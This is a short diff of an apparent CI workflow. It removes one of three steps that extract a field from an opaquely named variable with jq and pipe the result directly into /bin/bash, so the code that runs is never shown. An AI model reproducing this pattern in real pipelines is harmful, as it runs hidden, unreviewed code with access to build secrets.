@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$ikgw795" | jq -r .mejsa05154 | /bin/bash
           echo $nxybb07899 | jq -r .nn70051 | /bin/bash
-          printf '%s' "$ukv06" | jq -r .sako79 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
